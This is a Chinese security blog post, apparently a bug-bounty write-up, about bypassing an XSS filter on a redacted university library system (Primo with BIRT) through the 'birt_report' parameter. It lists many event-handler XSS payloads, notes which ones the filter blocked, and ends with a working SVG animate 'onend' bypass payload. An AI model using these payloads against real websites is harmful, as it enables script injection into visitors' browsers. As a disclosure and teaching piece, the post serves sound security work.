---
title: 【SRC挖掘】记一次XSS绕过
url: https://mp.weixin.qq.com/s/xUQ_P3wzmTGkU3127S7Pow
source: Doonsec's feed
date: 2026-09-18
fetch_date: 2026-09-19T06:50:42.063773
---

# 【SRC挖掘】记一次XSS绕过

# 【SRC挖掘】记一次XSS绕过

原创

Blimey029
Blimey029

N0n4m3 Sec

![]()

在小说阅读器读本章

去阅读

![]()

在公众号小说中沉浸阅读

**郑重声明**

任何网络安全测试活动均须事先获得明确授权。本公众号文章的内容源自作者日常积累，未经许可严禁转载。本文所提及的技术漏洞均已完成修复，文中涉及的技术方法仅作教学交流之用，严禁任何非法用途。因不当使用而产生的全部责任均由使用者自行承担。本文讨论的所有案例与技术内容，旨在提升读者的安全防护意识，协助构建更完善的安全防护体系，有效抵御潜在网络威胁。

![](https://mmbiz.qpic.cn/mmbiz_png/ibRSlrHvGFOnavDG7M7GuhibzyZEiaXfXpwPOa0Mo2eGrr2h1ibgsIk8eSP8TGKnLo1IIBOiauuK8IPHgyedgNWnqq3cV6Tq6FVdF0j0YcUvRtVo/640?wx_fmt=png&from=appmsg)

**前言**

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibRSlrHvGFOkMxibC3aQrXccRrY6ARLWLWnR28diaMgdzUPkIuo4yhxLXvHJo41X440IcOKNb9su1fbaD16PEeJIicq4y1iapfKVXibpaeFaOvkicM/640?wx_fmt=png&from=appmsg)

在渗透测试的世界里，最致命的漏洞往往披着最普通的外衣。一次针对某高校系统的常规安全测试中，一个看似平平无奇的功能入口，却因为一个隐秘的传参点，悄然撕开了防线的一角。

当我们锁定这个可疑的交互点时，测试过程却并未如想象中顺利。从最初简单的脚本标签被无情过滤，到尝试各种变形绕过再次被拦截，测试一度陷入僵局。但正是在这种反复试探与推敲中，我们摸清了过滤机制的薄弱环节——它并非无懈可击，只是我们还未找到合适的绕过方式。

在经历了数种 Payload 的失败与碰壁后，通过巧妙的闭合与构造特殊的命名空间事件，我们最终绕过了防御，成功在页面上触发了弹窗。这不仅是一次漏洞的挖掘记录，也是一次对过滤规则的深入分析。

![](https://mmbiz.qpic.cn/mmbiz_png/ibRSlrHvGFOk1yd1R6GK7LTONZa35Zh4VUSN9Jr9u2QfIDp0jyPTzRQb2ApBd9jdkWny1NlF5HH9v8czicXnuvdtDNH9WbmJrhkCKu99jmIDY/640?wx_fmt=png&from=appmsg)

**正文**

目标URL：

https://xxx.lib.xxx.edu.cn:xxx/primo\_publishing/admin/xxx

![](https://mmbiz.qpic.cn/mmbiz_png/ibRSlrHvGFOmDSibEtPlEjyLRKfmDxx87mtbgrCicu2tibSFySru9pseeIVaNQun4PicQsqDqmjicsjOcZYlJpM7sSDLvN0qg3Hww7hdlMI9EoiaaE/640?wx_fmt=png&from=appmsg)

指纹：Primo（ExLibris 图书馆发现系统）

![](https://mmbiz.qpic.cn/mmbiz_png/ibRSlrHvGFOnPVy9XRumUibAKN2vhYK65zItiaZXrD7IrAyfM8M5HH5owaYicp4haqQBFoxCDOjacNMiaibKvKEHxjRjfsPUVKooupQDm5CYYzqNE/640?wx_fmt=png&from=appmsg)

枚举已知组件的入口路径：**/birt/frameset**

拼接到根路径：https://xxx.lib.xxx.edu.cn:xxx/birt/frameset

访问后302重定向，响应包Location头里带出：

**?birt\_report=%3F**

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibRSlrHvGFOnjaUW8JUuch2fuxfw3EiakeL5FOib3nbJYmbASkDNJ52IB3LxyUjHysCkoy5rEAxL1uS5ibRq22VDb5SAicOXLY5pon6fuRfmgticI/640?wx_fmt=png&from=appmsg)

再拿获取到的接口拼接到根路径：

/primo\_publishing/admin/xxx?**birt\_report**=zzqx9mark

即：https://xxx.lib.xxx.edu.cn:xxx/primo\_publishing/admin/xxx?**birt\_report**=zzqx9mark

其中**zzqx9mark**为随机字符（用`test` 、`123` 这类常见词，页面自身内容可能就含它们），从响应包中可以看到 zzqx9mark 已包含在 value 属性内<input type="hidden" name="birt\_report" value="zzqx9mark">

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibRSlrHvGFOmibB9BEg4PpQKHQoFPCnssuZicLrficIb4Gc4r4EYibPxzuOaavTqsGl7IK0k2179dGIkMKveZgicrtRIhHEKQ06VthSyv7QR4siba8/640?wx_fmt=png&from=appmsg)

尝试闭合拼接

Payload：zzqx9mk"><script>alert(1)</script>

结果被过滤成zzqx9mk">>alert(1)

系统过滤了<script </script>

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibRSlrHvGFOlGgFp3oicdibTmjmgWVNYklF5W0sGYMZ6nFiaOv6ZGbmQVsXhS1icLc2xc4KELokFXCH53dm0tvfdXKTl3578JibNvK1TIssfVUoZ4/640?wx_fmt=png&from=appmsg)

尝试双写绕过：

<scr<script>ipt>alert(1)</scr</script>ipt>

结果还是被狠狠过滤了。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibRSlrHvGFOkH7NicfWelVYiaaYz3cibV9pmc68zkVZz52zDadiaIYrZZzQd1iaHCcZdDnvfib6RIOrDZImOEgwP23Z9bhrnHbbWtXibpaF5rwm4AWk/640?wx_fmt=png&from=appmsg)

尝试正常的闭合：zzqx9mk"><b>x</b>

发现能正常写入，还是有希望的

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibRSlrHvGFOlicfr0el06dNib6IGDTSuLCcQqibhxxzpyfRKLriaWnicb4FBuZKCyWgv5BEPrvj9BeZv5Pe7PvMbZzUA2ibay9jtlzLPXTdS71hRNI/640?wx_fmt=png&from=appmsg)

然后通过以下语句一一进行测试，如下表所示为400拦截的

|  |  |  |
| --- | --- | --- |
| ****语句**** | ****标签含义**** | ****触发方式**** |
| <svg/onload=alert(1)> | <svg> 是可缩放矢量图形标签；onload 是加载完成事件 | 浏览器解析并渲染SVG 时，onload 事件立即执行，无需用户交互 |
| <img/src=x/onerror=alert(1)> | <img> 是图片标签；src 指定图片地址，onerror 是加载失败事件 | src=x 指向不存在的资源，加载失败即触发 onerror，无需交互，最经典 |
| <b/onclick=alert(1)> | <b> 是加粗文本标签；onclick 是鼠标点击事件 | 必须用户点击该加粗文字才执行 |
| <b/onmouseover=alert(1)> | <b> 加粗标签；onmouseover 是鼠标悬停事件 | 鼠标移到文字上才执行 |
| <b/onfocus=alert(1)> | <b> 加粗标签；onfocus 是获得焦点事件 | <b> 默认不可聚焦，用户无法用 Tab 或点击使其获得焦点，缺少 tabindex 属性时不会执行 |
| <details/open/ontoggle=alert(1)> | <details> 是可展开的详情标签；open 表示默认展开，ontoggle 是展开/收起状态变化事件 | open 使页面加载时自动展开，状态变化触发 ontoggle，无需交互 |
| <b/onmouseenter=alert(1)> | <b> 加粗标签；onmouseenter 是鼠标进入元素事件 | 鼠标移入文字区域时执行，与onmouseover 类似但不冒泡 |
| <animate/onbegin=alert(1)> | <animate> 是 SVG 动画元素；onbegin 是动画开始事件 | <animate> 必须嵌套在 <svg> 内部才有效，脱离 SVG 上下文浏览器不解析为动画，单独写不会执行 |
| <svg/OnLoAd=alert(1)> | <svg> 矢量图标签；OnLoAd 是 onload 的大小写混写形式 | HTML 属性名不区分大小写，效果同第 1 条，常用于测试过滤器是否只匹配小写 |
| <script>alert(1)</script> | <script> 是脚本标签，用于嵌入或引用 JavaScript | 浏览器解析到即执行，但现代网站和浏览器通常直接拦截，是最易被过滤的payload |
| <b/href=javascript:alert(1)> | <b> 加粗标签；href 不是 <b> 的合法属性 | href 对 <b> 无效，javascript: 伪协议只在 <a>、<area> 等链接标签的 href 中生效，此语句不会执行 |
| <iframe/src=...> | <iframe> 是内嵌框架标签，可在当前页面嵌入另一个页面；src 指定嵌入地址 | src="javascript:alert(1)" 可执行 JS，src="http://evil.com" 可嵌入外部恶意页面，能否执行取决于浏览器和 CSP 限制 |

如下表所示为200原样反射的

|  |  |  |
| --- | --- | --- |
| ****语句**** | ****标签含义**** | ****触发方式**** |
| <animate/onend=alert(1)> | <animate> 是 SVG 动画元素；onend 是动画播放结束事件 | <animate> 必须嵌套在 <svg> 内部才有效，脱离 SVG 上下文不解析为动画；即使放在 SVG 内，也需动画真正播放完才触发 onend |
| <animate/onrepeat=alert(1)> | <animate> 是 SVG 动画元素；onrepeat 是动画每次循环重复时触发的事件 | 同样必须嵌套在<svg> 内且动画设置了 repeatCount（循环次数）才会触发；单独写不会执行 |
| <video/onplay=alert(1)> | <video> 是视频标签；onplay 是视频开始播放时触发的事件 | 需要视频真正开始播放才触发，而浏览器通常禁止自动播放（autoplay 受限），因此多数情况下需用户手动点击播放，或需配合 autoplay + muted 才可能自动触发 |
| <b/onanimationstart=alert(1)> | <b> 加粗标签；onanimationstart 是 CSS 动画开始播放时触发的事件 | 只有当该元素被应用了CSS @keyframes 动画并开始播放时才触发；单独写 <b> 没有动画，事件不会触发 |
| <b/ontransitionend=alert(1)> | <b> 加粗标签；ontransitionend 是 CSS 过渡动画结束时触发的事件 | 只有当元素被应用了CSS transition 过渡属性并实际发生过渡后才触发；单独写没有过渡效果，事件不会触发 |
| <b/onauxclick=alert(1)> | <b> 加粗标签；onauxclick 是鼠标非主键（中键、右键等）点击时触发的事件 | 需要用户用鼠标中键或右键点击该元素才触发，需用户交互 |
| <marquee/onstart=alert(1)> | <marquee> 是已废弃的滚动文字标签；onstart 是滚动开始事件 | <marquee> 在多数现代浏览器中仍能解析（虽已废弃），滚动开始时触发 onstart，无需用户交互；但未来浏览器可能彻底移除 |
| <b/onpointerover=alert(1)> | <b> 加粗标签；onpointerover 是指针设备（鼠标、触控笔、触摸）移入元素时触发的事件 | 指针移入元素时触发，鼠标悬停即可，也支持触摸/触控笔，需用户交互 |

综合以上我们还是选择点击链接自动弹窗的语句为主，比如

<animate/onend=alert(1)>

 从下图可以看到F12中并未被过滤

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibRSlrHvGFOk6PbhkBicfNLOnZHVapNs8GBrHzYGapB7K4bI8CVopz77CXeenCTEtKuicPvhPjGVichCcTQfLKCjG4OtWvxGGgicGMlhDbSNicRTM/640?wx_fmt=png&from=appmsg)

最终payload整合成：

<svg><rect><animate attributeName=x dur=0.1s onend=alert(1)>

|  |  |  |
| --- | --- | --- |
| **部件** | **作用** | **删掉会怎样** |
| **<svg>** | 进入SVG 命名空间——SMIL 动画只活在 SVG 里 | <animate> 裸放 HTML 里不运行动画，不派发 endEvent |
| **<rect>** | <animate> 默认动画目标是父元素；rect 提供一个有 x 属性可动的目标 | animate 无有效目标，动画不跑 |
| **attributeName=x** | SMIL 规范要求 animate 必须声明动哪个属性；x 是 rect 的横坐标 | 动了也无视觉影响（rect 无宽高，隐形）；属性缺失 → 元素无效 → 动画不启动 |
| **dur=0.1s** | 动画时长0.1 秒——页面加载后约 100ms 就派发 endEvent | 若写10s，受害者可能早关页面了，endEvent 没等到 |
| **onend=alert(1)** | endEvent 派发时的处理器 | — |

闭合拼接后，访问后成功弹窗

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibRSlrHvGFOnVcnUjOplFIwqvC80304g23rnhVrqoxISVgXcokh2NQl9HalnOpRFHuMQvTq7qSnHHfNzMbmzLpWMd7BQlUarnCPIBzkpKLDU/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_gif/ibRSlrHvGFOkpmb66cWyOoeH8ASAaAicRPiaPrhoNibaibPBCMoLZE7ug8DlxGsdOSyWmlQCkDmPRJPOdpWibKdylT4U49HrxUKbiaNMnnPwvY4oW8/640?wx_fmt=gif&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_gif/ibRSlrHvGFOlcsMvev8A43TvxCqptujxibwJCT6OYxpPjDV2hZAheHc7VtlUlhHFasRsULEtXqB2mgVrOQZY6D5lFAUgdY7RTtPiaicY3kZvKX4/640?wx_fmt=gif&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_gif/ibRSlrHvGFOkPuhWaXWNc0ylMsOS25iaKfdETcN7qrKA8EWicdoPCfFribl8Z4aD3BGE4tJlvVIhyOfUZsaezIws9toSYXURRuSDib1ymBxrNELk/640?wx_fmt=gif&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/ibRSlrHvGFOmOphd0GjPLTDYBqk74CXVtqWRa1Ufm0MIb6851xHmic64F3vviaNmpfrBFibABNpKEhnibex7f3NhuObGP9cicEty9yCn9zPXFJ3X0/640?wx_fmt=png&from=appmsg)

end

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibRSlrHvGFOl5ctzmfd2PZ6AEQsan8opLLMaGr5bYvaU5FspuEeic5ZrdwISibLYIHkMh90yefy4d5Tt0cpVTAwElMAtPw1QrI4jfoRx0quyyk/640?wx_fmt=png&from=appmsg)

预览时标签不可点

![]()

微信扫一扫
关注该公众号

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/sz_mmbiz_png/8icmwDsB6dCoTibvjCxRlW0T8NO6ocVKrG61WUHkavD7Y3prcxc6uZpluD4GLs5CngzYfrxN2pAQ2utVw1ATFdlA/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过